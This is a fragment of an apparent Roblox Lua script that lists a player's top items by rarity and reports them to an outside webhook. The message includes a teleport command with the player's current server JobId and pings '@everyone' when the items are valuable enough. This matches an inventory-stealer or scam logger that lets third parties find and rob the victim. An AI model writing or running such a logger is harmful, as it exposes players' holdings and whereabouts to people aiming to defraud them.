...
local valueCount = 0
local totalPlayerValue = 0 -- Added variable to track total player value
...
for i = 1, math.min(10, #allItems) do
    table.insert(topItems, allItems[i])
end

-- Define rarity order
local rarityPriority = {"Godly", "Ancient", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
local rarityGroups = {
    Godly = {},
    Ancient = {},
    Vintage = {},
...
-- Group top items by rarity
for _, item in ipairs(topItems) do
    local rarity = item.rarity
    if rarityGroups[rarity] then
        table.insert(rarityGroups[rarity], item.name)
    end
end

-- Build the formatted output string
local EverythingString = ""
for _, rarity in ipairs(rarityPriority) do
    if #rarityGroups[rarity] > 0 then
        EverythingString = EverythingString .. "-- // " .. rarity .. "\n"
        for _, itemName in ipairs(rarityGroups[rarity]) do
            EverythingString = EverythingString .. itemName .. ",\n"
        end
        EverythingString = EverythingString .. "\n"
    end
end
...
-- Check if total value is above 25 before deciding to ping everyone
local webhookContent = ""
if valueCount >= 25 then
    webhookContent = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")'
else
    webhookContent = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")'
end

SendWebhook(webHook, {content = webhookContent, embeds = {WebHookEmbed}})
